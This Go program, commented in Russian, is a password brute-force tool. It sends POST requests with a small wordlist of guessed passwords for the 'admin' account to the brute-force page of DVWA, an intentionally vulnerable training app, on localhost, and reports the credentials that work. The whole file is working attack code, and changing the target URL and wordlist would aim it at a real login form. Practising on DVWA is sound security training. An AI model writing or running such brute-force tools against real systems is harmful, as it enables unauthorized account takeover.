package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cookiejar" // Пакет cookiejar из стандартной библиотеки
	"net/url"
	"strings"
	"time"
)

// Функция для отправки POST-запроса на форму авторизации
func tryLogin(username, password string, client *http.Client) bool {
	// URL страницы входа в DVWA
	loginURL := "http://localhost/dvwa/vulnerabilities/brute/"

	// Подготовка данных формы для отправки
	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)
	data.Set("Login", "Login")

	// Отправка POST-запроса
	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	if err != nil {
		log.Println("Ошибка при создании запроса:", err)
		return false
	}

	// Устанавливаем заголовки
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "GoBot")

	// Выполнение запроса
	resp, err := client.Do(req)
	if err != nil {
		log.Println("Ошибка при выполнении запроса:", err)
		return false
	}
	defer resp.Body.Close()

	// Чтение ответа
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Println("Ошибка при чтении ответа:", err)
		return false
	}

	// Печать тела ответа для отладки
	// fmt.Println(string(body))

	// Проверка на неправильный логин и пароль
	if strings.Contains(string(body), "Username and/or password incorrect") {
		// Неверный пароль
		return false
	}

	// Проверка на успешную авторизацию (например, отсутствие формы на странице)
	if !strings.Contains(string(body), "username") && !strings.Contains(string(body), "password") {
		// Если форма больше не содержится на странице, значит, вход успешен
		return true
	}

	// Если не нашли ошибки и форма всё ещё присутствует, то вход неудачен
	return false
}

func main() {
	// Имя пользователя (предполагается, что оно известно)
	username := "admin"

	// Словарь паролей
	passwords := []string{
		"admin123",
		"password",
		"123456",
		"password1",
		"letmein",
		"password", // правильный пароль
		// Добавьте другие пароли в словарь
	}

	// Создаём HTTP клиент с поддержкой cookies
	jar, err := cookiejar.New(nil) // создаем новый CookieJar
	if err != nil {
		log.Fatal("Ошибка при создании CookieJar:", err)
	}
	client := &http.Client{
		Jar: jar,
	}

	// Перебор паролей
	for _, password := range passwords {
		if tryLogin(username, password, client) {
			// Выводим успешную пару логин/пароль
			fmt.Printf("Найден правильный логин и пароль: %s:%s\n", username, password)
			break
		}
		time.Sleep(1 * time.Second) // Добавляем задержку между попытками
	}
}
